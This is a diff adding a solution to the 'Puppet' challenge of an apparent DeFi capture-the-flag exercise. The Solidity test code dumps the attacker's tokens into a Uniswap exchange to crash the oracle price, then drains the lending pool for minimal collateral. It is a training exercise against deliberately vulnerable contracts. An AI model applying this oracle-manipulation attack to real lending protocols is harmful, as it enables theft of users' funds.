@@ -120,6 +120,46 @@ contract Puppet is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        uint256 initialPrice = uniswapExchange.getTokenToEthInputPrice(
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        console.log("initial price (wei) =", initialPrice);
+
+        uint256 remainingEth = UNISWAP_INITIAL_ETH_RESERVE - initialPrice;
+        console.log("remaining ether (wei) =", remainingEth);
+
+        uint256 expectedPrice = calculateTokenToEthInputPrice(
+            1 ether,
+            UNISWAP_INITIAL_TOKEN_RESERVE + ATTACKER_INITIAL_TOKEN_BALANCE,
+            remainingEth
+        );
+        console.log("expected price (wei) =", expectedPrice);
+
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        console.log(
+            "allowance for exchange =",
+            dvt.allowance(attacker, address(uniswapExchange))
+        );
+        uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            DEADLINE
+        );
+
+        uint256 newPrice = uniswapExchange.getTokenToEthInputPrice(1 ether);
+        console.log("new price (wei) =", newPrice);
+        assertEq(newPrice, expectedPrice);
+
+        uint256 depositRequired = puppetPool.calculateDepositRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+
+        puppetPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
+
         /** EXPLOIT END **/
         validation();
     }
